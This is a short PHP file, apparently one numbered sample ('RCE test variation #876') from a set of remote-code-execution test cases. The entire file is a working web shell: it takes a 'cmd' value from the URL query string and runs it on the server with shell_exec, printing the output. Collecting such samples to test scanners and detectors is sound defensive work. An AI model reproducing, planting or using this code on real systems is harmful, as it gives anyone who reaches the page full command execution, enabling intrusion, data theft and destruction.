<?php
// RCE test variation #876
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>